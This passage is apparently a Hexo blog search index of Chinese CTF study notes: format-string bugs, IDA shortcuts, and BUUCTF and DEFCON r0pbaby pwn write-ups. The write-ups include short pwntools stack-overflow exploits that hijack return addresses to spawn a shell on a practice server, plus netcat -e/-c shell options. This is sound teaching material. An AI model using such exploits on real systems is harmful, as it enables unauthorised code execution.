<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2022/06/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/06/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><img src="/2022/06/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20220617132148632.png" style="zoom:25%;"><p>格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>。</p><p>在进入printf之后，函数首先会获取第一个参数，一个个读取其字符串会遇到两种情况：</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>如果我们写成了这个样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);</span><br></pre></td></tr></table></figure><p>没有提供参数，然而程序照样运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li><p>解析其地址对应的字符串</p></li><li><p>解析其内容对应的整形值</p></li><li><p>解析其内容对应的浮点值</p><p>对于1来说如果提供了一个0这样的不可访问地址，程序就会崩溃。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA基本用法</title>
      <link href="/2022/05/12/IDA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
      <url>/2022/05/12/IDA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-常用快捷键"><a href="#1-常用快捷键" class="headerlink" title="1.常用快捷键"></a>1.常用快捷键</h2><p><code>a</code>：将数据转换为字符串</p><p><code>f5</code>：一键反汇编</p><p><code>esc</code>：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下 esc，会关闭该窗口）</p><p><code>shift+f12</code>：可以打开 string 窗口，一键找出所有的字符串，右击 setup，还能对窗口的属性进行设置</p><p><code>ctrl+w</code>：保存 ida 数据库</p><p><code>ctrl+s</code>：选择某个数据段，直接进行跳转</p><p><code>ctrl+鼠标滚轮</code>：能够调节流程视图的大小</p><p><code>x</code>：对着某个函数、变量按该快捷键，可以查看它的交叉引用</p><p><code>g</code>：直接跳转到某个地址</p><p><code>n</code>：更改变量的名称</p><p><code>y</code>：更改变量的类型</p><p><code>/</code>：在反编译后伪代码的界面中写下注释</p><p><code>\</code>：在反编译后伪代码的界面中隐藏 / 显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p><p><code>；</code>：在反汇编后的界面中写下注释</p><p><code>ctrl+shift+w</code>：拍摄 IDA 快照</p><p><code>u</code>：undefine，取消定义函数、代码、数据的定义</p><h2 id="2-在流程视图中添加地址偏移"><a href="#2-在流程视图中添加地址偏移" class="headerlink" title="2.在流程视图中添加地址偏移#"></a>2.在流程视图中添加地址偏移<a href="https://www.wangan.com/docs/551#718d7a">#</a></h2><p>在这个视图中添加地址偏移的话，我们取地址就非常方便，不再需要<code>按空格切换视图</code>去找，在菜单栏中设置：<code>option–&gt;general</code></p><img src="/2022/05/12/IDA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/image-20220512200923236.png" style="zoom:25%;"><h2 id="3-自动添加反汇编注释"><a href="#3-自动添加反汇编注释" class="headerlink" title="3.自动添加反汇编注释"></a>3.自动添加反汇编注释</h2><p>同样是在菜单栏中设置：<code>option–&gt;general</code></p><img src="/2022/05/12/IDA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/image-20220512201336433.png" style="zoom:25%;"><h2 id="4-创建数组"><a href="#4-创建数组" class="headerlink" title="4.创建数组"></a>4.创建数组</h2><p>首先点击选中你想要转换成数组的一块区域：</p><img src="/2022/05/12/IDA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/image-20220512201832766.png" style="zoom:25%;"><p>接着在菜单栏中选择：edit–&gt;array，就会弹出如下的选项框</p><img src="/2022/05/12/IDA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/image-20220512201948699.png" style="zoom:25%;"><p>下面来解释一下各个参数的意思：</p><p><code>Array element size</code> 这个值表示各数组元素的大小（这里是 1 个字节），是根据你选中的数据值的大小所决定的</p><p><code>Maximum possible size </code>这个值是由自动计算得出的，他表示数组中的元素的可能的最大值</p><p><code>Array size </code>表示数组元素的数量，一般都根据你选定的自动产生默认值</p><p><code>Items on a line </code>这个表示指定每个反汇编行显示的元素数量，它可以减少显示数组所需的空间</p><p><code>Element print width</code> 这个值用于格式化，当一行显示多个项目时，他控制列宽</p><p><code>Use “dup” construct </code>：使用重复结构，这个选项可以使得相同的数据值合并起来，用一个重复说明符组合成一项</p><p><code>Signed elements </code>表示将数据显示为有符号数还是无符号数</p><p><code>Display indexes</code> 显示索引，使得数组索引以常规的形式显示，如果选了这个选项，还会启动右边的 Indexes 选项栏，用于选择索引的显示格式</p><p><code>Create as array </code>创建为数组，这个一般默认选上的</p><p>创建完以后，则</p><img src="/2022/05/12/IDA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/image-20220512202358305.png" style="zoom:25%;"><p>可以看到这些数据已经被当成一个数组折叠到了一起，或许会遇到 <code>n dup(0xff)</code> 这样的，表示有 n 个重复的数据 0xff。</p><h2 id="5-函数调用图"><a href="#5-函数调用图" class="headerlink" title="5.函数调用图"></a>5.函数调用图</h2><p>菜单栏中：view–&gt;graphs–&gt;Function calls (快捷键 Ctrl+F12)</p><h2 id="6-函数流程图"><a href="#6-函数流程图" class="headerlink" title="6.函数流程图"></a>6.函数流程图</h2><p>菜单栏中：view–&gt;graphs–&gt;flowt chart (快捷键 F12)</p><h2 id="7-IDA-常见命名意义"><a href="#7-IDA-常见命名意义" class="headerlink" title="7.IDA 常见命名意义"></a>7.IDA 常见命名意义</h2><p>IDA 经常会自动生成假名字。他们用于表示子函数，程序地址和数据。根据不同的类型和值假名字有不同前缀</p><p>sub 指令和子函数起点<br>locret 返回指令<br>loc 指令<br>off 数据，包含偏移量<br>seg 数据，包含段地址值<br>asc 数据，ASCII 字符串<br>byte 数据，字节（或字节数组）<br>word 数据，16 位数据（或字数组）<br>dword 数据，32 位数据（或双字数组）<br>qword 数据，64 位数据（或 4 字数组）<br>flt 浮点数据，32 位（或浮点数组）<br>dbl 浮点数，64 位（或双精度数组）<br>tbyte 浮点数，80 位（或扩展精度浮点数）<br>stru 结构体 (或结构体数组)<br>algn 对齐指示<br>unk 未处理字节</p><p>IDA 中有常见的说明符号，如 db、dw、dd 分别代表了 1 个字节、2 个字节、4 个字节</p><p>参考</p><ul><li><a href="https://link.wangan.com/check?link=https://xz.aliyun.com/t/4205%23toc-12">https://xz.aliyun.com/t/4205#toc-12</a></li><li><a href="https://www.wangan.com/docs/551">https://www.wangan.com/docs/551</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF PWN【刷题记录篇】</title>
      <link href="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/"/>
      <url>/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="nc命令："><a href="#nc命令：" class="headerlink" title="nc命令："></a>nc命令：</h2><blockquote><p>-c shell命令为“-e”；使用/bin/sh来执行 [危险]</p><p>-e 文件名程序在连接后执行 [危险]</p><p>-b 允许广播</p><p>-g 网关源路由跃点，最多8个</p><p>-G num源路由指针：4，8，12。。。</p><p>-i secs 发送的线路和扫描的端口的延迟间隔为1秒</p><p>-k 在套接字上设置keepalive选项</p><p>-l 监听模式，用于入站连接</p><p>-n 仅数字IP地址，无DNS</p><p>-o 文件十六进制流量转储</p><p>-p 端口本地端口号</p><p>-r 随机化本地和远程端口</p><p>-q secs 在stdin上的EOF和秒延迟后q秒退出</p><p>-s addr地址本地源地址</p><p>-T tos 设置服务类型</p><p>-t 应答TELNET协商</p><p>-u UDP模式</p><p>-v verbose(使用两次可更详细)</p><p>-w 秒连接和最终网络读取超时</p><p>-C 发送CRLF作为行尾</p><p>-z 零I/O模式(用于扫描)</p></blockquote><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>首先利用<code>checksec</code>命令查看文件</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426163121384.png" style="zoom:25%;"><p>把文件拉到IDA查看，shift+F12转到字符串窗口，发现<code>gets</code> <code>system</code> <code>/bin/sh</code></p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426163422833.png" style="zoom:25%;"><p>在main函数中F5反汇编</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426163638519.png" style="zoom:25%;"><blockquote><p>gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。</p></blockquote><p><code>gets((__int64)&amp;s, (__int64)argv);</code></p><p>双击 s ，查看需要多少字节 。以此来确定偏移量。</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426164125296.png" style="zoom:25%;"><blockquote><p>注意到 后面还有 <code>db 8 dup(?)</code><br>db： 定义字节类型变量的伪指令<br>dup()： 重复定义圆括号中指定的初值，次数由前面的数值决定<br>?： 只分配存储空间，不指定初值 </p></blockquote><p>因此 最后偏移量为 ： 15+8 = 23 。</p><p>///可以通过pwndbg计算偏移量</p><p>执行<code>cyclic -n 8 200</code></p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426165245532.png" style="zoom:25%;"><p>r运行，</p><p>1.<img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426165419982.png" style="zoom:25%;"></p><p>2.<img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426165543033.png" style="zoom:25%;"></p><p>3.<img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426170529825.png" style="zoom:25%;"></p><p>回到 IDA pro中。寻找是否存在 系统调用函数。<br>找到 <code>fun()</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看得到地址0x40118A</p><blockquote><p>exp编写步骤</p><p>from pwn import *       #引入pwn库<br>p = remote(ip, port)     # 输入对应的ip地址和端口号来连接其他主机的服务<br>… # 输入payload来进行操作以拿到程序的shell payload一般等于 偏移量 + 地址</p><p>p.sendline(payload)</p><p>p.interactive() # 反弹shell</p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25204</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">23</span> + p64(<span class="number">0x40118A</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行python exp.py</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220426172749852.png" style="zoom:25%;"><p>发现flag ， cat flag 得到 flag{2be84b3b-3172-481a-bc4b-dd99c48f0639}</p><hr><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>checksec一下</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505000905121.png" style="zoom:25%;"><p>这个程序没有开启任何的保护，放入IDA看一下</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505001433437.png" style="zoom:25%;"><p>发现有gets函数，可以看出程序为<code>v5</code>开辟了<code>40H</code>的存储空间，所以输入长度超过<code>40H</code>即可造成溢出，再看<code>sprint()</code>函数</p><p>进入<code>sub_40060D</code>中看一下：</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505001742476.png" style="zoom:25%;"><p>我们需要控制溢出位置，把返回地址改为此函数的地址</p><p>在pwndbg计算偏移量</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505002058327.png" style="zoom:25%;"><p>r运行</p><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505002213193.png" style="zoom:25%;"><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505002252366.png" style="zoom:25%;"><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505002415348.png" style="zoom:25%;"><p>exp </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26864</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + p64(<span class="number">0x40060D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><img src="/2022/04/26/BUUCTF-PWN%E3%80%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AF%87%E3%80%91/image-20220505002920056.png" style="zoom:25%;"><p>即得flag.</p><hr><h2 id="ROPgadget使用方法"><a href="#ROPgadget使用方法" class="headerlink" title="ROPgadget使用方法"></a>ROPgadget使用方法</h2><p>​    -h, –help           显示帮助文档<br>​    -v, –version        版本号<br>​    -c, –checkUpdate    检测新版本是否可用<br>​    –binary <binary>    指定二进制文件进行分析<br>​    –opcode <opcodes>   在可执行段中查找opcode<br>​    –string <string>    在可读的段中查找字符串<br>​    –memstr <string>    查找单个byte在所有的可执行段中<br>​    –depth <nbyte>      搜索引擎的深度<br>​    –only <key>         只显示特别的指令<br>​    –filter <key>       过滤特定指令<br>​    –range <start-end>  在地址之间寻找(0x…-0x…)<br>​    –badbytes <byte>    拒绝特定指令在gadget的地址下<br>​    –rawArch <arch>     指定文件架构<br>​    –rawMode <mode>     指定源文件的mode<br>​    –rawEndian <endian> 指定源文件的endianness<br>​    –re <re>            正则表达式<br>​    –offset <hexaddr>   指定gadget的地址偏移<br>​    –ropchain           ROP chain的生成<br>​    –thumb              在ARM架构下使用搜索引擎thumb 模式<br>​    –console            使用交互终端对于搜索引擎<br>​    –norop              禁止ROP搜索引擎<br>​    –nojop              禁止JOP搜索引擎<br>​    –callPreceded       仅显示call-preceded的gadgets<br>​    –nosys              禁止SYS搜索引擎<br>​    –multibr            允许多分枝gadgets<br>​    –all                禁止删除重复的gadgets，即显示所有<br>​    –noinstr            禁止gadget指令终端打印<br>​    –dump               输出gadget bytes</hexaddr></re></endian></mode></arch></byte></start-end></key></key></nbyte></string></string></opcodes></binary></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEFCON-2015-r0pbaby</title>
      <link href="/2022/04/18/DEFCON-2015-r0pbaby/"/>
      <url>/2022/04/18/DEFCON-2015-r0pbaby/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>题源：<a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby">https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby</a></p><p>这是一道经典的简单64位ROP链构造题</p><p>首先看一下<img src="/2022/04/18/DEFCON-2015-r0pbaby/image-20220418134719546.png" style="zoom:25%;"></p><p>执行一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ ./r0pbaby</span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line"><span class="number">1</span>) Get libc address</span><br><span class="line"><span class="number">2</span>) Get address of a libc function</span><br><span class="line"><span class="number">3</span>) Nom nom r0p buffer to <span class="built_in">stack</span></span><br><span class="line"><span class="number">4</span>) Exit</span><br><span class="line">: <span class="number">1</span></span><br><span class="line">libc.so<span class="number">.6</span>: <span class="number">0x00007FBE204DD9B0</span></span><br><span class="line"><span class="number">1</span>) Get libc address</span><br><span class="line"><span class="number">2</span>) Get address of a libc function</span><br><span class="line"><span class="number">3</span>) Nom nom r0p buffer to <span class="built_in">stack</span></span><br><span class="line"><span class="number">4</span>) Exit</span><br><span class="line">: <span class="number">2</span></span><br><span class="line">Enter symbol: system</span><br><span class="line">Symbol system: <span class="number">0x00007FBE1FD30390</span></span><br><span class="line"><span class="number">1</span>) Get libc address</span><br><span class="line"><span class="number">2</span>) Get address of a libc function</span><br><span class="line"><span class="number">3</span>) Nom nom r0p buffer to <span class="built_in">stack</span></span><br><span class="line"><span class="number">4</span>) Exit</span><br><span class="line">: <span class="number">3</span></span><br><span class="line"><span class="function">Enter bytes to <span class="title">send</span> <span class="params">(max <span class="number">1024</span>)</span>: 5</span></span><br><span class="line"><span class="function">1234</span></span><br><span class="line"><span class="function">1) Get libc address</span></span><br><span class="line"><span class="function">2) Get address of a libc function</span></span><br><span class="line"><span class="function">3) Nom nom r0p buffer to <span class="built_in">stack</span></span></span><br><span class="line"><span class="function">4) Exit</span></span><br><span class="line"><span class="function">: 3</span></span><br><span class="line"><span class="function">Enter bytes to <span class="title">send</span> <span class="params">(max <span class="number">1024</span>)</span>: 3</span></span><br><span class="line"><span class="function">123</span></span><br><span class="line"><span class="function">1) Get libc address</span></span><br><span class="line"><span class="function">2) Get address of a libc function</span></span><br><span class="line"><span class="function">3) Nom nom r0p buffer to <span class="built_in">stack</span></span></span><br><span class="line"><span class="function">4) Exit</span></span><br><span class="line"><span class="function">: Bad choice.</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><p>1可以获取libc的基址；2获取libc某个函数地址，输入system发现获取了对应地址；</p><p>3用来copy数据到栈上，在两次输入时，当输入的字符超过指定的大小时，程序退出并打印Bad choice。</p><p>1、2是leak info所用</p><hr><p>IDA反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *handle; <span class="comment">// [rsp+8h] [rbp-448h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">1088</span>]; <span class="comment">// [rsp+10h] [rbp-440h] BYREF</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+450h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to an easy Return Oriented Programming challenge...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Menu:&quot;</span>);</span><br><span class="line">  handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_BF7();</span><br><span class="line">          <span class="keyword">if</span> ( !sub_B9A(nptr, <span class="number">1024LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Bad choice.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          v3 = strtol(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Enter symbol: &quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( sub_B9A(nptr, <span class="number">64LL</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v4 = dlsym(handle, nptr);</span><br><span class="line">            __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Symbol %s: 0x%016llX\n&quot;</span>, nptr, v4);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Bad symbol.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;libc.so.6: 0x%016llX\n&quot;</span>, handle);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Enter bytes to send (max 1024): &quot;</span>);</span><br><span class="line">      sub_B9A(nptr, <span class="number">1024LL</span>);</span><br><span class="line">      v5 = (<span class="keyword">int</span>)strtol(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 - <span class="number">1</span> &gt; <span class="number">0x3FF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid amount.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          v7 = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">              <span 